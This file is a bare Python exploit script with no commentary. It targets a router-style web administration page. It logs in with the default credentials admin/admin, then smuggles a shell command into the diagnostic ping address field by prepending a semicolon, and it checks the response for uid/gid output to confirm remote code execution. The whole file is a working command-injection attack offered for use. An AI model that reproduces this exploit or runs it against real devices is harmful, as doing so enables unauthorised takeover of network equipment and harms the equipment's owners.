import requests
import sys

def exploit(host,mode, cmd): 
	session = requests.Session()
	header = { 

	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q:0.9,image/webp,*/*;q:0.8",
	"Accept-Language": "en-US,en;q:0.5",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "application/x-www-form-urlencoded",
	"Content-Length": "132",
	"Origin": "http://192.168.1.1",
	"Connection": "close",
	"Referer": "http://192.168.1.1/",
	"Upgrade-Insecure-Requests": "1"
	}

	datas = {
		
		"Command":"Submit",
		"expires":"Wed%2C+12+Aug+2020+15%3A20%3A05+GMT",
		"browserTime":"081119502020",
		"currentTime":"1597159205",
		"user":"admin",
		"password":"admin"
	}

	#auth
	session.post(host+"/cgi-bin/login.cgi" , headers=header , data = datas)

	#rce
	rce_data = {
		"Command":"Diagnostic",
		"traceMode":"ping",
		"reportIpOnly":"",
		"pingIpAddr":";".encode("ISO-8859-1").decode()+cmd,
		"pingPktSize":"56",
		"pingTimeout":"30",
		"pingCount":"4",
		"maxTTLCnt":"30",
		"queriesCnt":"3",
		"reportIpOnlyCheckbox":"on",
		"btnApply":"Apply",
		"T":"1597160664082"
	}
	rce = session.post(host+"/cgi-bin/system_log.cgi" , headers=header , data = rce_data, timeout=5)
	if mode == "attack": 
		if "uid=" in rce.text and "gid=" in rce.text: 
			return True
		else : 
			return False
	if mode == "shell": 
		return True